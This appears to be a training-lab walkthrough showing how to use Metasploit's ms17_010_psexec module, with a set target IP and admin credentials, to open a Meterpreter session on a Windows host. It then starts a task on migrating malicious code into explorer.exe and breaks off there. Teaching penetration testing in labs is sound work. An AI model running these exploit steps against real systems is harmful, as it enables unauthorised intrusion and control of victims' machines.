 # cheat sheet for getting a meterpreter session on a windows system.

''

Start a Meterpreter Session on a Windows System

To be able to penetrate a network, you need to exploit a system first. After exploiting this system, you can perform various tasks, which can be pivoting or lateral movements. Depending on the network environment, you need to choose your attack. However, as the first task, a system must be exploited.

In this task, you will learn to connect to a Windows Host and Launch the Exploit. To do this, perform the following steps:
Step 1

Ensure you have powered on all the devices listed in the introduction and connect to PLABKALI01.

On the PLABKALI01 desktop, click the metasploit framework icon.

Figure 1.9 Screenshot of PLABKALI01
Figure 1.9 Screenshot of PLABKALI01: Clicking the metasploit icon on the desktop.

Step 3

On the terminal window displayed, type:

msfconsole

Figure 1.10 Screenshot of PLABKALI01
Figure 1.10 Screenshot of PLABKALI01: Showing the command to startup the Metasploit framework typed in.

Step 4

The metasploit framework has started now.
Note: The number of exploits and payloads will change from time to time.

Figure 1.11 Screenshot of PLABKALI01
Figure 1.11 Screenshot of PLABKALI01: Showing the msf5 prompt after the Metasploit framework starts.

Step 5

You will now use the PsExec exploit. To do this, type the following command:

use exploit/windows/smb/ms17_010_psexec

Press Enter.

Figure 1.12 Screenshot of PLABKALI01
Figure 1.12 Screenshot of PLABKALI01: Entering the psexec command at the msf5 prompt.

Step 6

Next, type the following command:

set RHOST 192.168.0.5

Press Enter.

Figure 1.13 Screenshot of PLABKALI01
Figure 1.13 Screenshot of PLABKALI01: Setting the remote host for exploitation.

Step 7

You will now need to provide user credentials. To do this, type the following command:

set SMBUser admin

Press Enter.

Figure 1.14 Screenshot of PLABKALI01
Figure 1.14 Screenshot of PLABKALI01: Setting the SMBUser.

Step 8

You need to now set the password for the user. Type the following command:

set SMBPass Passw0rd

Press Enter.

Figure 1.15 Screenshot of PLABKALI01
Figure 1.15 Screenshot of PLABKALI01: Setting the password for the SMBUser.

Step 9

Finally, type the following command:

run

Press Enter.

Figure 1.16 Screenshot of PLABKALI01
Figure 1.16 Screenshot of PLABKALI01: Running the exploit using the run command.

Step 10

After the run command completes, notice that a session with the victim’s system is now established.
Note: In case the system returns “no session was created”, repeat the run command to create the meterpreter session.

Figure 1.17 Screenshot of PLABKALI01
Figure 1.17 Screenshot of PLABKALI01: Showing the established session with the victim and showing the victim’s system as exploited.

Keep the terminal window open.
Task 3 - Migrate Malicious Code to an Exploited Windows Host

After you have exploited a Windows host, you can migrate the malicious code to it. This code needs to be transferred from a Meterpreter session to a running process, such as explorer.exe.

In this task, you will migrate malicious code to an exploited Windows host. To do this, perform the following steps:

''


